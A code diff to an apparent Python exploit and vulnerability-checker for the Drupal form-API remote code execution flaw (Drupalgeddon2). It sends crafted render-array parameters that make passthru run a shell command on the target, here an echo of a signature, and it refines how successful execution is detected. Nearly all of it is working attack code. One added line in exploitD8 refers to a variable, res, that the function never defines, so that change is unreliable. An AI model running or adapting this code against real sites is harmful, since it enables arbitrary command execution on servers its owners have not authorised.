@@ -70,7 +70,7 @@ def isPwnAbleWithQ(host):
     signature = ulti.genSignature()
     get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                     'name[#type]': 'markup',
-                    'name[#markup]': ' echo ' + signature}
+                    'name[#markup]': 'echo ' + signature}
     post_params = {'form_id': 'user_pass',
                     '_triggering_element_name': 'name'}
     try:
@@ -87,7 +87,8 @@ def isPwnAbleWithQ(host):
         post_params = {'form_build_id': found}
         res = requests.post(host, data=post_params, params=get_params)
         detect = bool(re.search(signature, res.text))
-        if detect:
+        n = bool(re.search('echo ' + signature, res.text))
+        if detect and not n:
             return True
     else:
         return False
@@ -116,7 +117,8 @@ def exploitD7Clean(host):
         # post url, not host
         res = requests.post(url, data=post_params)
         detect = bool(re.search(signature, res.text))
-        if detect:
+        n = bool(re.search('echo ' + signature, res.text))
+        if detect and not n:
             return True
         else:
             return False
@@ -129,14 +131,15 @@ def exploitD8(host):
     post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                     'mail[a][#post_render][]': 'passthru',
                     'mail[a][#type]': 'markup',
-                    'mail[a][#markup]': ' echo ' + signature}
+                    'mail[a][#markup]': 'echo ' + signature}
     try:
         r = requests.post(url, data=post_params, verify=False, timeout = 50)
     except Exception as e:
         print e
         return False
-    m = bool(re.search(signature, r.text))
-    if m:
+    detect = bool(re.search(signature, r.text))
+    n = bool(re.search('echo ' + signature, res.text))
+    if detect and not n:
         return True
     else:
         return False
